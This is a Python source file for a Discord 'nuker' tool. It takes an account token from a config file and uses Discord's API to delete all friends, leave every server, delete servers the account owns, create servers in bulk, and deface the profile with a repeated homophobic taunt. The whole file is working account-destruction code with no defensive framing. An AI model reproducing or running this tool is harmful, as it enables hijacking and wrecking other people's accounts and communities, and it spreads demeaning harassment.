# byte#6110

import json, requests, sys, os, time, base64
from os import system

with open('config.json') as config:
    config = json.load(config)

    token = config.get('token')


def colourize(text):
    system(""); faded = ""
    red = 110
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;255m{line}\033[0m\n")
        if not red == 0:
            red -= 15
            if red < 0:
                red = 0
    return faded

def clear():
    kernel = sys.platform
    match kernel:
        case 'win32':
            os.system('cls')

def gn():
    try:
        clear()
        art_file = open('source/ascii.txt', encoding='UTF-8').read()
        art = colourize(art_file)
        print(art)

        script = input('[>] ')
        headers = {'authorization': token}

        match script:
            case '1':
                try:
                    url = 'https://discord.com/api/users/@me'
                    request = requests.get(url, headers=headers)

                    match request.status_code:
                        case 200:
                            change_details(headers, token)
                    
                        case _:
                            print('[>] Token is invalid')
                            input('[>] Press enter to return to main menu')
                            gn()



                except KeyboardInterrupt:
                    gn()

    except KeyboardInterrupt:
        gn()

def remove_friends(headers, token):

    print('[>] Grabbing friends')
    print(f'[>] Using token: {token}')

    url = 'https://discord.com/api/v9/users/@me/relationships'
    request = requests.get(url, headers=headers)
    
    match request.status_code:
        case 200:

            response = request.text
            response_json = json.loads(response)

            for i in response_json:
                uuid = i.get('id')
                url = f'https://discord.com//api/v9/users/@me/relationships/{uuid}'
                request = requests.delete(url, headers=headers)

                match request.status_code:
                    case 204:
                        print(f'[>] Removed {uuid}')

                    case 429:
                        for i in response_json:
                            ratelimit = i.get('retry_after')
                    
                        print(f'Sleeping for {ratelimit}')
                        time.sleep(ratelimit)


                    case _:
                        print(f'[>] Failed to remove {uuid} | Status code: {request.status_code}')

        case 429:
            response = request.text
            response_json = json.loads(response)
            for i in response_json:
                ratelimit = i.get('retry_after')
            
            print(f'[>] Sleeping for {ratelimit}')
            time.sleep(ratelimit)
            return

def leave_servers(headers, token):

    print('[>] Grabbing servers')
    print(f'[>] Using token: {token}')

    url = 'https://discord.com/api/v9/users/@me/guilds'
    request = requests.get(url, headers=headers)

    match request.status_code:
        case 200:
            response = request.text
            response_json = json.loads(response)

            for i in response_json:
                uuid = i.get('id')
                name = i.get('name')
                ownership = i.get('owner')

                match ownership:
                    case True:
                        url = f'https://discord.com/api/v9/guilds/{uuid}/delete'
                        request = requests.post(url, headers=headers)

                        match request.status_code:
                            case 204:
                                print(f'[>] Deleted server: {name}')

                            case _:
                                print(f'[>] Failed to delete server {name} | Status code: {request.status_code}')

                    case False:
                        url = f'https://discord.com/api/v9/users/@me/guilds/{uuid}'
                        request = requests.delete(url, headers=headers)
                        payload = {'lurking': False}

                        match request.status_code:
                            case 204:
                                print(f'[>] Left server {name}')

                            case _:
                                print(f'[>] Failed to leave server {name} | Status code: {request.status_code}\n')

def make_servers(headers, token):

    print(f'[>] Using token: {token}')

    url = 'https://discord.com/api/v9/guilds'
    payload = {'name': 'gay nuker :3', 'channels': [], 'guild_template_code': '2TffvPucqHkN'}
    amount = int(input('[>] Amount: '))
    created = 0
    while amount > created:
        request = requests.post(url, headers=headers, json=payload)

        match request.status_code:
            case 201:
                created +=1
                print(f'[>] Made {created} servers')

            case 429:
                response = request.text
                response_json = json.loads(response)
                ratelimit = response_json.get('retry_after')
                print(f'[>] Sleeping for {ratelimit}')
                time.sleep(ratelimit)

            case _:
                print(request.text)
                print(request.status_code)

def change_details(headers, token):
    print(f'[>] Using token: {token}')

    with open('source/avatar.png', 'rb') as file:
        avatar = 'data:image/png;base64, ' + ''.join(base64.b64encode(file.read()).decode())

    avatar = {'avatar': avatar, 'bio': 'gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here'}
    url = 'https://discord.com/api/v9/users/@me'
    request = requests.patch(url, headers=headers, json=avatar)
    
    match request.status_code:
        case 200:
            print('[>] Changed profile')
        
        case _:
            print(f'[>] Failed to change profile | Status code: {request.status_code}')

if __name__ == '__main__':
    gn()